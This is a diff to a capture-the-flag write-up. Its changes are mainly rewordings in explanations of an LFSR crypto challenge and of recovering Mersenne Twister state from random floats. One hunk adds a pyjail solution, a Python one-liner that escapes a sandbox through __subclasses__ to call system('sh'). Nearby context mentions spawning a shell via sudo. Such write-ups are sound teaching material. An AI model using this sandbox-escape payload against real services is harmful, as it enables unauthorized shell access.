@@ -88,7 +88,7 @@ We will use the sudo command to run the `/usr/bin/socket` command to spawn a she
 
 ## After the CTF
 
-I was stuck on these challenges during the competition. I have captured these solutions and descriptions for future reference. 
+I was stuck on these challenges during the competition. I have captured these solutions and my analysis for future reference. 
 
 #### Futile
 `Linear Futile Shift Register`
@@ -146,7 +146,7 @@ This challenge was full of red herrings. We are given a challenge server, that r
 
 ```
 
-Since the LFSR generator uses random initial state, it is possible that the initial state can be all zeros. This is invalid as there is no information to generate subsequent bits. Hence the function throws an exception.  We can capitalize on this fact.
+Since the LFSR generator uses a random initial state, it is possible that the initial state can be all zeros. This is invalid as there is no information to generate subsequent bits. Hence the function throws an exception.  We can capitalize on this fact that no flag character is ever XORed with 0 (which would return itself).
 ```
     ...
     ...
@@ -220,7 +220,7 @@ The challenge server runs the following program, which prints a series of 624 ra
         print('Nope! It was:', secret)
 ```
 
-The wrinkle is that it takes two 32-bit integers to generate each floating point number. And, 11 bits of the total of 64 bits are lost in converting the integers to a 53-bit IEEE 754 floating point value. Those 11 bits have to be recreated for each uniform random value to accurately recreate the internal state.  This is where I use the absolutely fantastic symbolic mersenne untwister program. 
+The wrinkle is that it takes two 32-bit integers to generate each floating point number. And, 11 bits of the total of 64 bits are lost in converting the integers to a 53-bit IEEE 754 floating point value. Those 11 bits have to be recreated for each uniform random value to accurately recreate the internal state.  This is where the absolutely fantastic symbolic mersenne untwister comes in handy. 
 
 ```python
     CONST_2E53 = 1.0 * 2 ** 53
@@ -253,8 +253,8 @@ The wrinkle is that it takes two 32-bit integers to generate each floating point
         for _ in range(624):
             u = random.uniform(0, MAX)              
             n1, n2 = float_to_2_rands(u/MAX)        # convert to a float between 0 .. 1, and get the two 32 bit rands
-            bits_n1 = f"{n1:027b}" + "?????"        # bits that were lost
-            bits_n2 = f"{n2:026b}" + "??????"       # bits that were lost
+            bits_n1 = f"{n1:027b}" + "?????"        # add back the bits that were lost as symbolic variables
+            bits_n2 = f"{n2:026b}" + "??????"       # add back the bits that were lost as symbolic variables
 
             assert (len(bits_n1) == 32)
             assert (len(bits_n2) == 32)
@@ -281,7 +281,10 @@ The wrinkle is that it takes two 32-bit integers to generate each floating point
             assert( u == v )
 
 ```
-
+#### pyjail solutions
+```python
+    >>> print("".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('sh'))
+```
 
 #### pyGulag solutions
 ```python
@@ -326,7 +329,7 @@ The wrinkle is that it takes two 32-bit integers to generate each floating point
 |Misc|I_Use_zsh_BTW|
 |Misc|Irreductible|
 |Misc|Pygulag|
-|Misc|Pyjail|
+|Misc|Pyjail|filtered[eval, exec], 23< input < 127, only print() allowed
 |Misc|Welcome|
 |OSINT|Hero Agency 1/4|
 |OSINT|Hero Agency 2/4|
